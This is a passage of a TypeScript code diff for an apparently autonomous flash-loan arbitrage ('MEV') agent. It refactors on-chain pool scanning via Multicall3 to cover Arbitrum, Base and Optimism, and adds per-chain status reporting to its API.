+      id: `opp-${params.chain}-${cleanPair}-${cleanBuy}-${cleanSell}-${params.blockNumber}-${params.routeType}`,
+      chain: params.chain,
       timestamp: Date.now(),
-      blockNumber: this.latestBlock,
+      blockNumber: params.blockNumber,
       pair: params.pair,
       buyDex: params.buyDex,
       buyPool: params.buyPool,
@@ -1310,7 +1486,7 @@ class LiveMevAgent {
     sweptToken?: string;
     recipient?: string;
   }> {
-    const chain = options?.chain || 'arbitrum';
+    const chain = options?.chain || opp.chain || 'arbitrum';
     const rpcInfo = RPC_ENDPOINTS[chain] || RPC_ENDPOINTS.arbitrum;
     const contractAddr = DEPLOYED_CONTRACTS[chain];
 
@@ -1349,13 +1525,13 @@ class LiveMevAgent {
       };
     }
 
-    const candidates = resolveArbitrageCandidates(routeInput, profitWallet);
+    const candidates = resolveArbitrageCandidates({ ...routeInput, chain }, profitWallet);
     if (candidates.length === 0) {
       return {
         ok: false,
         statusCode: 422,
         simulationFailed: true,
-        error: `Route ${routeInput.buyDex} -> ${routeInput.sellDex} uses an unsupported router (FlashArbOptimized supports Uniswap V3, PancakeSwap V3, SushiSwap V3, and Sushiswap V2). Pick an executable pool pair.`,
+        error: `Route ${routeInput.buyDex} -> ${routeInput.sellDex} on ${rpcInfo.name} uses an unsupported router. Pick a FlashArbOptimized-supported pool pair (Uniswap V3, PancakeSwap V3, SushiSwap V3, Uniswap V2, Sushiswap V2, BaseSwap V2).`,
       };
     }
 
@@ -1510,10 +1686,11 @@ class LiveMevAgent {
       ? ethers.formatUnits(decodedSwap.netProfitSwept, verifiedCandidate.borrowedToken.dec)
       : '0';
     const sweptRecipient = decodedSwap ? decodedSwap.recipient : profitWallet;
-    const ethUsd = this.pools.find((p) => p.pair === 'WETH/USDC')?.priceUsd || opp.buyPrice;
+    const chainPools = this.poolsByChain[chain] || this.pools;
+    const ethUsd = chainPools.find((p) => p.pair === 'WETH/USDC')?.priceUsd || opp.buyPrice;
     const borrowedSym = verifiedCandidate.borrowedToken.sym;
     const realizedUsd =
-      decodedSwap && (borrowedSym === 'USDC' || borrowedSym === 'USDC.e' || borrowedSym === 'USDT' || borrowedSym === 'DAI')
+      decodedSwap && (borrowedSym === 'USDC' || borrowedSym === 'USDC.e' || borrowedSym === 'USDbC' || borrowedSym === 'USDT' || borrowedSym === 'DAI')
         ? Number(sweptAmount)
         : decodedSwap && borrowedSym === 'WETH'
         ? Number(sweptAmount) * ethUsd
@@ -1523,6 +1700,7 @@ class LiveMevAgent {
 
     const executedTrade: ExecutedAgentTrade = {
       id: `arb-${Date.now()}-${sentTxHash.slice(2, 8)}`,
+      chain,
       txHash: sentTxHash,
       timestamp: Date.now(),
       blockNumber: receipt.blockNumber,
@@ -1592,7 +1770,8 @@ class LiveMevAgent {
       return;
     }
 
-    const bestExecutable = [...this.opportunities]
+    const allOpps = SUPPORTED_SCAN_CHAINS.flatMap((c) => this.opportunitiesByChain[c] || []);
+    const bestExecutable = allOpps
       .filter((o) => o.isProfitable && o.contractExecutable)
       .sort((a, b) => b.estNetProfitUsd - a.estNetProfitUsd)[0];
 
@@ -1604,7 +1783,7 @@ class LiveMevAgent {
     this.agentState = 'OPPORTUNITY_FOUND';
     this.lastExecutionTimestamp = Date.now();
     try {
-      await this.verifyAndExecuteOpportunity(bestExecutable);
+      await this.verifyAndExecuteOpportunity(bestExecutable, { chain: bestExecutable.chain });
     } catch (err: any) {
       this.agentState = 'SCANNING';
       this.lastExecutionNotice = err?.message || 'Autonomous execution cycle failed';
@@ -1614,243 +1793,360 @@ class LiveMevAgent {
   // Last scan error (null when the latest scan fully succeeded)
   public lastError: string | null = null;
 
+  public getStatusForChain(requestedChain: string) {
+    const key = (requestedChain || 'arbitrum').toLowerCase();
+    if (key === 'all') {
+      const mergedPools = SUPPORTED_SCAN_CHAINS.flatMap((c) => this.poolsByChain[c] || []);
+      const mergedOpps = SUPPORTED_SCAN_CHAINS.flatMap((c) => this.opportunitiesByChain[c] || []);
+      mergedOpps.sort((a, b) => {
+        const profitFlagDelta = Number(b.isProfitable) - Number(a.isProfitable);
+        if (profitFlagDelta !== 0) return profitFlagDelta;
+        const execDelta = Number(Boolean(b.contractExecutable)) - Number(Boolean(a.contractExecutable));
+        if (execDelta !== 0) return execDelta;
+        return b.estNetProfitUsd - a.estNetProfitUsd;
+      });
+      return {
+        chain: 'all' as const,
+        latestBlock: this.latestBlockByChain.arbitrum || 0,
+        pools: mergedPools,
+        opportunities: mergedOpps,
+        activeContract: DEPLOYED_CONTRACTS.arbitrum,
+        scanError: this.lastErrorByChain.arbitrum,
+      };
+    }
+    const c: SupportedArbChain = key === 'base' || key === 'optimism' ? key : 'arbitrum';
+    return {
+      chain: c,
+      latestBlock: this.latestBlockByChain[c] || 0,
+      pools: this.poolsByChain[c] || [],
+      opportunities: this.opportunitiesByChain[c] || [],
+      activeContract: DEPLOYED_CONTRACTS[c],
+      scanError: this.lastErrorByChain[c],
+    };
+  }
+
   /**
-   * Reads real pool state from Arbitrum One over JSON-RPC and builds opportunities from it.
-   * A pool whose call fails or returns nothing is OMITTED: no price, depth or spread is ever
-   * substituted, guessed or derived from another pool. If the RPC itself fails, pools and
-   * opportunities are cleared and the error is exposed via `lastError`.
+   * Reads real pool state for a single L2 chain (`arbitrum` | `base` | `optimism`) over JSON-RPC Multicall3
+   * and builds arbitrage opportunities from measured on-chain depth and live fee tiers.
    */
-  public async scan() {
+  public async scanChain(chain: SupportedArbChain): Promise<{
+    pools: MonitoredPoolState[];
+    opportunities: LiveArbitrageOpportunity[];
+    routeInputs: Map<string, RouteExecutionInput>;
+    blockNumber: number;
+  }> {
+    const specs = POOL_SPECS_BY_CHAIN[chain] || [];
+    const chainRouters = getChainDexRouters(chain);
+    const rpcLabel = RPC_ENDPOINTS[chain]?.name || chain;
+
+    interface SubCallRef { poolIdx: number; kind: 'state' | 'liquidity' | 'fee' }
+    const subCalls: Array<{ target: string; allowFailure: boolean; callData: string }> = [];
+    const subRefs: SubCallRef[] = [];
+    const stateCallIdxByPool = new Array<number>(specs.length).fill(-1);
+    const liqCallIdxByPool = new Array<number>(specs.length).fill(-1);
+    const feeCallIdxByPool = new Array<number>(specs.length).fill(-1);
+
+    specs.forEach((p, i) => {
+      const stateSel =
+        p.kind === 'algebra' ? '0xe76c01e4' : p.kind === 'v2' ? '0x0902f1ac' : '0x3850c7bd';
+      stateCallIdxByPool[i] = subCalls.length;
+      subCalls.push({ target: p.address, allowFailure: true, callData: stateSel });
+      subRefs.push({ poolIdx: i, kind: 'state' });
+      if (p.kind !== 'v2') {
+        liqCallIdxByPool[i] = subCalls.length;
+        subCalls.push({ target: p.address, allowFailure: true, callData: '0x1a686502' });
+        subRefs.push({ poolIdx: i, kind: 'liquidity' });
+      }
+      if (p.kind === 'slipstream') {
+        feeCallIdxByPool[i] = subCalls.length;
+        subCalls.push({ target: p.address, allowFailure: true, callData: '0xddca3f43' });
+        subRefs.push({ poolIdx: i, kind: 'fee' });
+      }
+    });
+
+    const CHUNK_SIZE = 70;
+    const rpcBatch: any[] = [
+      { jsonrpc: '2.0', method: 'eth_blockNumber', params: [], id: 1 },
+      { jsonrpc: '2.0', method: 'eth_gasPrice', params: [], id: 2 },
+    ];
+    const chunkRanges: Array<{ rpcId: number; start: number; end: number }> = [];
+    for (let start = 0; start < subCalls.length; start += CHUNK_SIZE) {
+      const end = Math.min(subCalls.length, start + CHUNK_SIZE);
+      const rpcId = 10 + chunkRanges.length;
+      const callData = multicallIface.encodeFunctionData('aggregate3', [subCalls.slice(start, end)]);
+      rpcBatch.push({
+        jsonrpc: '2.0',
+        method: 'eth_call',
+        params: [{ to: MULTICALL3_ADDRESS, data: callData }, 'latest'],
+        id: rpcId,
+      });
+      chunkRanges.push({ rpcId, start, end });
+    }
+
+    const { results } = await fetchRpcBatchWithFailover(chain, rpcBatch);
+
+    const byId = new Map<number, string>();
+    for (const item of results) {
+      if (item && item.id !== undefined && typeof item.result === 'string' && item.result !== '0x') byId.set(item.id, item.result);
+    }
+
+    const block = parseInt(byId.get(1) || '', 16);
+    const gasPriceWei = byId.get(2) ? Number(BigInt(byId.get(2)!)) : NaN;
+    if (!Number.isFinite(block) || !Number.isFinite(gasPriceWei)) {
+      throw new Error(`${rpcLabel} RPC returned no block/gas price`);
+    }
+    this.latestBlockByChain[chain] = block;
+    if (chain === 'arbitrum') this.latestBlock = block;
+
+    const returnDatas = new Array<string | null>(subCalls.length).fill(null);
+    for (const chunk of chunkRanges) {
+      const raw = byId.get(chunk.rpcId);
+      if (!raw) continue;
+      try {
+        const [decoded] = multicallIface.decodeFunctionResult('aggregate3', raw);
+        for (let offset = 0; offset < decoded.length; offset++) {
+          const entry = decoded[offset];
+          if (entry?.success && typeof entry.returnData === 'string' && entry.returnData !== '0x') {
+            returnDatas[chunk.start + offset] = entry.returnData;
+          }
+        }
+      } catch {
+        // ignore malformed chunk
+      }
+    }
+
+    const word = (hex: string, i: number) => BigInt('0x' + hex.slice(2 + i * 64, 2 + (i + 1) * 64));
+    const Q96 = 2 ** 96;
+
+    interface Read { spec: PoolSpec; basePerQuote: number; depthQuote: number /* in-range, in quote units */; liveFeePercent: number }
+    const reads: Read[] = [];
+    specs.forEach((p, i) => {
+      const state = returnDatas[stateCallIdxByPool[i]];
+      if (!state) return;
+      const [t0, t1] = p.base.addr.toLowerCase() < p.quote.addr.toLowerCase() ? [p.base, p.quote] : [p.quote, p.base];
+      let token1PerToken0: number;
+      let depthQuote: number;
+      let liveFeePercent = p.fee;
+      try {
+        if (p.kind === 'v2') {
+          if (state.length < 130) return;
+          const r0 = Number(word(state, 0)) / 10 ** t0.dec;
+          const r1 = Number(word(state, 1)) / 10 ** t1.dec;
+          if (!(r0 > 0 && r1 > 0)) return;
+          token1PerToken0 = r1 / r0;
+          depthQuote = 2 * (p.quote === t0 ? r0 : r1);
+        } else {
+          if (state.length < 66) return;
+          const sqrt = Number(word(state, 0)) / Q96;
+          const liqHex = liqCallIdxByPool[i] >= 0 ? returnDatas[liqCallIdxByPool[i]] : null;
+          if (!(sqrt > 0) || !liqHex) return;
+          const L = Number(BigInt(liqHex));
+          if (!(L > 0)) return;
+          if (p.kind === 'algebra' && state.length >= 194) {
+            // globalState() word 2 = current dynamic fee in 1e-6 units -> feePercent = rawFee / 10_000
+            const algebraFee = Number(word(state, 2));
+            if (Number.isFinite(algebraFee) && algebraFee > 0 && algebraFee <= 50000) {
+              liveFeePercent = Number((algebraFee / 10000).toFixed(4));
+            }
+          } else if (p.kind === 'slipstream' && feeCallIdxByPool[i] >= 0) {
+            const feeHex = returnDatas[feeCallIdxByPool[i]];
+            if (feeHex && feeHex.length >= 66) {
+              const slipFee = Number(BigInt(feeHex.slice(0, 66)));
+              if (Number.isFinite(slipFee) && slipFee > 0 && slipFee <= 100000) {
+                liveFeePercent = Number((slipFee / 10000).toFixed(4));
+              }
+            }
+          }
+          token1PerToken0 = sqrt * sqrt * 10 ** (t0.dec - t1.dec);
+          // virtual in-range reserve of the quote token, in raw units -> whole tokens
+          const quoteRaw = p.quote === t1 ? L * sqrt : L / sqrt;
+          depthQuote = 2 * (quoteRaw / 10 ** p.quote.dec);
+        }
+      } catch {
+        return;
+      }
+      const quotePerBase = p.base === t0 ? token1PerToken0 : 1 / token1PerToken0;
+      if (!Number.isFinite(quotePerBase) || quotePerBase <= 0) return;
+      reads.push({ spec: p, basePerQuote: quotePerBase, depthQuote, liveFeePercent });
+    });
+
+    // ETH/USD reference = the real Uniswap V3 WETH/USDC 0.05% pool on this chain
+    const ethRef =
+      reads.find((r) => r.spec.pair === 'WETH/USDC' && r.spec.dex === 'Uniswap V3' && Math.abs(r.spec.fee - 0.05) < 0.001) ||
+      reads.find((r) => r.spec.pair === 'WETH/USDC' && r.spec.base.sym === 'WETH');
+    const ethUsd = ethRef ? ethRef.basePerQuote : null;
+    const quoteUsd = (q: Tok): number | null => (q.sym === 'WETH' ? ethUsd : 1);
+
+    const now = Date.now();
+    const priced: Array<Read & { priceUsd: number; depthUsd: number }> = [];
+    for (const r of reads) {
+      const qUsd = quoteUsd(r.spec.quote);
+      if (qUsd === null) continue; // needs ETH/USD and it is unavailable: omit, do not guess
+      const depthUsd = r.depthQuote * qUsd;
+      if (depthUsd < 5000) continue; // exclude dust/dormant pools
+      priced.push({ ...r, priceUsd: r.basePerQuote * qUsd, depthUsd });
+    }
+
+    const fmtUsd = (n: number) => (n >= 1e6 ? `$${(n / 1e6).toFixed(1)}M` : n >= 1e3 ? `$${(n / 1e3).toFixed(0)}K` : `$${n.toFixed(0)}`);
+    const chainPools: MonitoredPoolState[] = priced.map((r) => ({
+      id: r.spec.id,
+      chain,
+      name: r.spec.name,
+      dex: r.spec.dex,
+      pair: r.spec.pair,
+      poolAddress: r.spec.address,
+      feeTierPercent: r.liveFeePercent,
+      priceUsd: Number(r.priceUsd.toFixed(r.priceUsd < 10 ? 4 : 2)),
+      blockNumber: block,
+      lastUpdated: now,
+      depthSummary: `${fmtUsd(r.depthUsd)} in-range liquidity (on-chain)`,
+    }));
+
+    // Opportunities: evaluate every unordered pool pair (i < j) per token pair
+    const opps: LiveArbitrageOpportunity[] = [];
+    const chainRouteInputs = new Map<string, RouteExecutionInput>();
+    if (ethUsd !== null) {
+      const gasPriceGwei = gasPriceWei / 1e9;
+      const groups = new Map<string, typeof priced>();
+      for (const r of priced) groups.set(r.spec.pair, [...(groups.get(r.spec.pair) || []), r]);
+      let routeType = 0;
+      for (const [pair, group] of groups) {
+        if (group.length < 2) continue;
+        for (let i = 0; i < group.length; i++) {
+          for (let j = i + 1; j < group.length; j++) {
+            const a = group[i];
+            const b = group[j];
+            if (a.spec.address.toLowerCase() === b.spec.address.toLowerCase()) continue;
+            routeType++;
+            const aIsBuy = a.priceUsd <= b.priceUsd;
+            const buy = aIsBuy ? a : b;
+            const sell = aIsBuy ? b : a;
+            const opp = this.calculateOptimalParameters({
+              chain,
+              blockNumber: block,
+              pair,
+              buyDex: buy.spec.name,
+              buyPool: buy.spec.address,
+              sellDex: sell.spec.name,
+              sellPool: sell.spec.address,
+              buyPrice: buy.priceUsd,
+              sellPrice: sell.priceUsd,
+              feeTierA: buy.liveFeePercent,
+              feeTierB: sell.liveFeePercent,
+              depthA: buy.depthUsd,
+              depthB: sell.depthUsd,
+              routeType,
+              loanToken: buy.spec.base.sym,
+              ethUsd,
+              gasPriceGwei,
+              lighterRoute: buy.spec.kind !== 'v2' && sell.spec.kind !== 'v2',
+            });
+            if (opp) {
+              const buyRouterOk = Boolean(chainRouters[buy.spec.dex]?.supported);
+              const sellRouterOk = Boolean(chainRouters[sell.spec.dex]?.supported);
+              opp.contractExecutable = buyRouterOk && sellRouterOk;
+              opps.push(opp);
+              chainRouteInputs.set(opp.id, {
+                chain,
+                baseToken: buy.spec.base,
+                quoteToken: buy.spec.quote,
+                buyDex: buy.spec.dex,
+                buyFeePercent: buy.liveFeePercent,
+                sellDex: sell.spec.dex,
+                sellFeePercent: sell.liveFeePercent,
+                optimalLoanBaseUnits: opp.optimalLoanAmount,
+                buyPriceQuotePerBase: buy.basePerQuote,
+                buyPriceUsd: buy.priceUsd,
+                estNetProfitUsd: opp.estNetProfitUsd,
+              });
+            }
+          }
+        }
+      }
+    }
+
+    opps.sort((a, b) => {
+      const profitFlagDelta = Number(b.isProfitable) - Number(a.isProfitable);
+      if (profitFlagDelta !== 0) return profitFlagDelta;
+      const execDelta = Number(Boolean(b.contractExecutable)) - Number(Boolean(a.contractExecutable));
+      if (execDelta !== 0) return execDelta;
+      const netDelta = b.estNetProfitUsd - a.estNetProfitUsd;
+      if (Math.abs(netDelta) > 1e-6) return netDelta;
+      return b.grossSpreadBps - a.grossSpreadBps;
+    });
+
+    this.poolsByChain[chain] = chainPools;
+    this.opportunitiesByChain[chain] = opps;
+    this.lastErrorByChain[chain] = null;
+    this.lastSuccessfulScanByChain[chain] = now;
+    for (const [oppId, routeInput] of chainRouteInputs.entries()) {
+      this.routeInputsByOppId.set(oppId, routeInput);
+    }
+
+    return {
+      pools: chainPools,
+      opportunities: opps,
+      routeInputs: chainRouteInputs,
+      blockNumber: block,
+    };
+  }
+
+  /**
+   * Scans Arbitrum One, Base L2, and Optimism Mainnet in parallel via Multicall3.
+   */
+  public async scan(targetChain?: SupportedArbChain) {
     if (this.isScanning) return;
     this.isScanning = true;
     try {
       this.scanCount++;
       this.lastScanTimestamp = Date.now();
+      const chainsToScan: SupportedArbChain[] = targetChain ? [targetChain] : SUPPORTED_SCAN_CHAINS;
 
-      // Aggregate all pool state + liquidity reads into Multicall3.aggregate3() chunks
-      // so 60+ pools are read atomically with only 3-4 JSON-RPC items per HTTP batch.
-      interface SubCallRef { poolIdx: number; kind: 'state' | 'liquidity' }
-      const subCalls: Array<{ target: string; allowFailure: boolean; callData: string }> = [];
-      const subRefs: SubCallRef[] = [];
-      const stateCallIdxByPool = new Array<number>(POOL_SPECS.length).fill(-1);
-      const liqCallIdxByPool = new Array<number>(POOL_SPECS.length).fill(-1);
+      const results = await Promise.allSettled(
+        chainsToScan.map((c) => this.scanChain(c))
+      );
 
-      POOL_SPECS.forEach((p, i) => {
-        const stateSel = p.kind === 'v3' ? '0x3850c7bd' : p.kind === 'algebra' ? '0xe76c01e4' : '0x0902f1ac';
-        stateCallIdxByPool[i] = subCalls.length;
-        subCalls.push({ target: p.address, allowFailure: true, callData: stateSel });
-        subRefs.push({ poolIdx: i, kind: 'state' });
-        if (p.kind !== 'v2') {
-          liqCallIdxByPool[i] = subCalls.length;
-          subCalls.push({ target: p.address, allowFailure: true, callData: '0x1a686502' });
-          subRefs.push({ poolIdx: i, kind: 'liquidity' });
+      let anySucceeded = false;
+      results.forEach((r, idx) => {
+        const c = chainsToScan[idx];
+        if (r.status === 'fulfilled') {
+          anySucceeded = true;
+        } else {
+          const msg = r.reason?.message || String(r.reason);
+          this.lastErrorByChain[c] = msg;
+          if (Date.now() - (this.lastSuccessfulScanByChain[c] || 0) > 60000) {
+            this.poolsByChain[c] = [];
+            this.opportunitiesByChain[c] = [];
+          }
+          console.warn(`Flash-arb ${c} scan notice (recovering with failover/backoff):`, msg);
         }
       });
 
-      const CHUNK_SIZE = 70;
-      const rpcBatch: any[] = [
-        { jsonrpc: '2.0', method: 'eth_blockNumber', params: [], id: 1 },
-        { jsonrpc: '2.0', method: 'eth_gasPrice', params: [], id: 2 },
-      ];
-      const chunkRanges: Array<{ rpcId: number; start: number; end: number }> = [];
-      for (let start = 0; start < subCalls.length; start += CHUNK_SIZE) {
-        const end = Math.min(subCalls.length, start + CHUNK_SIZE);
-        const rpcId = 10 + chunkRanges.length;
-        const callData = multicallIface.encodeFunctionData('aggregate3', [subCalls.slice(start, end)]);
-        rpcBatch.push({
-          jsonrpc: '2.0',
-          method: 'eth_call',
-          params: [{ to: MULTICALL3_ADDRESS, data: callData }, 'latest'],
-          id: rpcId,
-        });
-        chunkRanges.push({ rpcId, start, end });
-      }
+      this.pools = this.poolsByChain.arbitrum;
+      this.opportunities = this.opportunitiesByChain.arbitrum;
+      this.latestBlock = this.latestBlockByChain.arbitrum || this.latestBlock;
+      this.lastError = this.lastErrorByChain.arbitrum;
 
-      const { results } = await fetchRpcBatchWithFailover('arbitrum', rpcBatch);
-
-      const byId = new Map<number, string>();
-      for (const item of results) {
-        if (item && item.id !== undefined && typeof item.result === 'string' && item.result !== '0x') byId.set(item.id, item.result);
-      }
-
-      const block = parseInt(byId.get(1) || '', 16);
-      const gasPriceWei = byId.get(2) ? Number(BigInt(byId.get(2)!)) : NaN;
-      if (!Number.isFinite(block) || !Number.isFinite(gasPriceWei)) throw new Error('Arbitrum RPC returned no block/gas price');
-      this.latestBlock = block;
-
-      const returnDatas = new Array<string | null>(subCalls.length).fill(null);
-      for (const chunk of chunkRanges) {
-        const raw = byId.get(chunk.rpcId);
-        if (!raw) continue;
-        try {
-          const [decoded] = multicallIface.decodeFunctionResult('aggregate3', raw);
-          for (let offset = 0; offset < decoded.length; offset++) {
-            const entry = decoded[offset];
-            if (entry?.success && typeof entry.returnData === 'string' && entry.returnData !== '0x') {
-              returnDatas[chunk.start + offset] = entry.returnData;
-            }
-          }
-        } catch {
-          // ignore malformed chunk
+      // Prune stale routeInputs to avoid unbounded growth across scans
+      const activeOppIds = new Set<string>(
+        SUPPORTED_SCAN_CHAINS.flatMap((c) => (this.opportunitiesByChain[c] || []).map((o) => o.id))
+      );
+      for (const existingKey of this.routeInputsByOppId.keys()) {
+        if (!activeOppIds.has(existingKey)) {
+          this.routeInputsByOppId.delete(existingKey);
         }
       }
 
-      const word = (hex: string, i: number) => BigInt('0x' + hex.slice(2 + i * 64, 2 + (i + 1) * 64));
-      const Q96 = 2 ** 96;
-
-      interface Read { spec: PoolSpec; basePerQuote: number; depthQuote: number /* in-range, in quote units */; liveFeePercent: number }
-      const reads: Read[] = [];
-      POOL_SPECS.forEach((p, i) => {
-        const state = returnDatas[stateCallIdxByPool[i]];
-        if (!state) return;
-        const [t0, t1] = p.base.addr.toLowerCase() < p.quote.addr.toLowerCase() ? [p.base, p.quote] : [p.quote, p.base];
-        let token1PerToken0: number;
-        let depthQuote: number;
-        let liveFeePercent = p.fee;
-        try {
-          if (p.kind === 'v2') {
-            if (state.length < 130) return;
-            const r0 = Number(word(state, 0)) / 10 ** t0.dec;
-            const r1 = Number(word(state, 1)) / 10 ** t1.dec;
-            if (!(r0 > 0 && r1 > 0)) return;
-            token1PerToken0 = r1 / r0;
-            depthQuote = 2 * (p.quote === t0 ? r0 : r1);
-          } else {
-            if (state.length < 66) return;
-            const sqrt = Number(word(state, 0)) / Q96;
-            const liqHex = liqCallIdxByPool[i] >= 0 ? returnDatas[liqCallIdxByPool[i]] : null;
-            if (!(sqrt > 0) || !liqHex) return;
-            const L = Number(BigInt(liqHex));
-            if (!(L > 0)) return;
-            if (p.kind === 'algebra' && state.length >= 194) {
-              // globalState() word 2 = current dynamic fee in 1e-6 units -> feePercent = rawFee / 10_000
-              const algebraFee = Number(word(state, 2));
-              if (Number.isFinite(algebraFee) && algebraFee > 0 && algebraFee <= 50000) {
-                liveFeePercent = Number((algebraFee / 10000).toFixed(4));
-              }
-            }
-            token1PerToken0 = sqrt * sqrt * 10 ** (t0.dec - t1.dec);
-            // virtual in-range reserve of the quote token, in raw units -> whole tokens
-            const quoteRaw = p.quote === t1 ? L * sqrt : L / sqrt;
-            depthQuote = 2 * (quoteRaw / 10 ** p.quote.dec);
-          }
-        } catch {
-          return;
-        }
-        const quotePerBase = p.base === t0 ? token1PerToken0 : 1 / token1PerToken0;
-        if (!Number.isFinite(quotePerBase) || quotePerBase <= 0) return;
-        reads.push({ spec: p, basePerQuote: quotePerBase, depthQuote, liveFeePercent });
-      });
-
-      // ETH/USD reference = the real Uniswap V3 WETH/USDC 0.05% pool
-      const ethRef = reads.find((r) => r.spec.id === 'univ3_weth_usdc_005');
-      const ethUsd = ethRef ? ethRef.basePerQuote : null;
-      const quoteUsd = (q: Tok): number | null => (q.sym === 'WETH' ? ethUsd : 1);
-
-      const now = Date.now();
-      const priced: Array<Read & { priceUsd: number; depthUsd: number }> = [];
-      for (const r of reads) {
-        const qUsd = quoteUsd(r.spec.quote);
-        if (qUsd === null) continue; // needs ETH/USD and it is unavailable: omit, do not guess
-        const depthUsd = r.depthQuote * qUsd;
-        if (depthUsd < 5000) continue; // exclude dust/dormant pools
-        priced.push({ ...r, priceUsd: r.basePerQuote * qUsd, depthUsd });
+      if (anySucceeded) {
+        this.consecutiveFailures = 0;
+        this.lastSuccessfulScan = Date.now();
+        await this.attemptAutonomousExecution();
+      } else {
+        this.consecutiveFailures++;
       }
-
-      const fmtUsd = (n: number) => (n >= 1e6 ? `$${(n / 1e6).toFixed(1)}M` : n >= 1e3 ? `$${(n / 1e3).toFixed(0)}K` : `$${n.toFixed(0)}`);
-      this.pools = priced.map((r) => ({
-        id: r.spec.id,
-        name: r.spec.name,
-        dex: r.spec.dex,
-        pair: r.spec.pair,
-        poolAddress: r.spec.address,
-        feeTierPercent: r.liveFeePercent,
-        priceUsd: Number(r.priceUsd.toFixed(r.priceUsd < 10 ? 4 : 2)),
-        blockNumber: this.latestBlock,
-        lastUpdated: now,
-        depthSummary: `${fmtUsd(r.depthUsd)} in-range liquidity (on-chain)`,
-      }));
-
-      // Opportunities: evaluate every unordered pool pair (i < j) per token pair
-      // so cross-DEX and cross-fee spreads (e.g., PancakeV3 <-> SushiV3 <-> SushiV2 <-> UniV3) are all surfaced.
-      const opps: LiveArbitrageOpportunity[] = [];
-      const nextRouteInputs = new Map<string, RouteExecutionInput>();
-      if (ethUsd !== null) {
-        const gasPriceGwei = gasPriceWei / 1e9;
-        const groups = new Map<string, typeof priced>();
-        for (const r of priced) groups.set(r.spec.pair, [...(groups.get(r.spec.pair) || []), r]);
-        let routeType = 0;
-        for (const [pair, group] of groups) {
-          if (group.length < 2) continue;
-          for (let i = 0; i < group.length; i++) {
-            for (let j = i + 1; j < group.length; j++) {
-              const a = group[i];
-              const b = group[j];
-              if (a.spec.address.toLowerCase() === b.spec.address.toLowerCase()) continue;
-              routeType++;
-              const aIsBuy = a.priceUsd <= b.priceUsd;
-              const buy = aIsBuy ? a : b;
-              const sell = aIsBuy ? b : a;
-              const opp = this.calculateOptimalParameters({
-                pair,
-                buyDex: buy.spec.name,
-                buyPool: buy.spec.address,
-                sellDex: sell.spec.name,
-                sellPool: sell.spec.address,
-                buyPrice: buy.priceUsd,
-                sellPrice: sell.priceUsd,
-                feeTierA: buy.liveFeePercent,
-                feeTierB: sell.liveFeePercent,
-                depthA: buy.depthUsd,
-                depthB: sell.depthUsd,
-                routeType,
-                loanToken: buy.spec.base.sym,
-                ethUsd,
-                gasPriceGwei,
-                lighterRoute: buy.spec.kind !== 'v2' && sell.spec.kind !== 'v2',
-              });
-              if (opp) {
-                const buyRouterOk = Boolean(ARBITRUM_DEX_ROUTERS[buy.spec.dex]?.supported);
-                const sellRouterOk = Boolean(ARBITRUM_DEX_ROUTERS[sell.spec.dex]?.supported);
-                opp.contractExecutable = buyRouterOk && sellRouterOk;
-                opps.push(opp);
-                nextRouteInputs.set(opp.id, {
-                  baseToken: buy.spec.base,
-                  quoteToken: buy.spec.quote,
-                  buyDex: buy.spec.dex,
-                  buyFeePercent: buy.liveFeePercent,
-                  sellDex: sell.spec.dex,
-                  sellFeePercent: sell.liveFeePercent,
-                  optimalLoanBaseUnits: opp.optimalLoanAmount,
-                  buyPriceQuotePerBase: buy.basePerQuote,
-                  buyPriceUsd: buy.priceUsd,
-                  estNetProfitUsd: opp.estNetProfitUsd,
-                });
-              }
-            }
-          }
-        }
-      }
-      opps.sort((a, b) => {
-        const profitFlagDelta = Number(b.isProfitable) - Number(a.isProfitable);
-        if (profitFlagDelta !== 0) return profitFlagDelta;
-        const execDelta = Number(Boolean(b.contractExecutable)) - Number(Boolean(a.contractExecutable));
-        if (execDelta !== 0) return execDelta;
-        const netDelta = b.estNetProfitUsd - a.estNetProfitUsd;
-        if (Math.abs(netDelta) > 1e-6) return netDelta;
-        return b.grossSpreadBps - a.grossSpreadBps;
-      });
-      this.opportunities = opps;
-      this.routeInputsByOppId = nextRouteInputs;
-      this.lastError = null;
-      this.consecutiveFailures = 0;
-      this.lastSuccessfulScan = Date.now();
-
-      await this.attemptAutonomousExecution();
     } catch (err: any) {
       this.consecutiveFailures++;
       this.lastError = err?.message || String(err);
-      // Keep existing pools for up to 60s during transient failover so UI stays responsive
       if (Date.now() - this.lastSuccessfulScan > 60000) {
         this.pools = [];
         this.opportunities = [];
@@ -1869,18 +2165,28 @@ const liveAgent = new LiveMevAgent();
  * GET /api/flash-arb/agent/status
  * Returns real-time autonomous agent status, live on-chain pool prices, and detected opportunities
  */
-flashArbRouter.get('/agent/status', (_req: Request, res: Response) => {
+flashArbRouter.get('/agent/status', (req: Request, res: Response) => {
+  const chainParam = String(req.query.chain || 'arbitrum').toLowerCase();
+  const statusView = liveAgent.getStatusForChain(chainParam);
   res.json({
     success: true,
+    chain: statusView.chain,
     isRunning: liveAgent.isRunning,
     scanCount: liveAgent.scanCount,
-    latestBlock: liveAgent.latestBlock,
+    latestBlock: statusView.latestBlock,
     lastScanTimestamp: liveAgent.lastScanTimestamp,
-    poolsCount: liveAgent.pools.length,
-    pools: liveAgent.pools,
-    opportunities: liveAgent.opportunities,
+    poolsCount: statusView.pools.length,
+    pools: statusView.pools,
+    opportunities: statusView.opportunities,
     executedTrades: liveAgent.executedTrades.slice(-20),
-    activeContract: DEPLOYED_CONTRACTS.arbitrum,
+    activeContract: statusView.activeContract,
+    countsByChain: {
+      arbitrum: liveAgent.poolsByChain.arbitrum.length,
+      base: liveAgent.poolsByChain.base.length,
+      optimism: liveAgent.poolsByChain.optimism.length,
+    },
+    blocksByChain: liveAgent.latestBlockByChain,
+    errorsByChain: liveAgent.lastErrorByChain,
     gasWallet: gasWalletEnv(),
     profitWallet: profitWalletEnv(),
     agentState: liveAgent.agentState,
@@ -1888,7 +2194,7 @@ flashArbRouter.get('/agent/status', (_req: Request, res: Response) => {
     lastConfirmedTxHash: liveAgent.lastConfirmedTxHash,
     lastConfirmedBlock: liveAgent.lastConfirmedBlock,
     lastExecutionNotice: liveAgent.lastExecutionNotice,
-    scanError: liveAgent.lastError,
+    scanError: statusView.scanError,
     config: {
       minProfitThresholdUsd: liveAgent.minProfitThresholdUsd,
       maxProfitCap: null, // No maximum profit cap (unbounded upside)
@@ -1988,24 +2294,29 @@ flashArbRouter.post('/agent/stop', (_req: Request, res: Response) => {
  */
 flashArbRouter.post('/agent/trigger', async (req: Request, res: Response) => {
   try {
-    // 1. Run fresh scan
-    await liveAgent.scan();
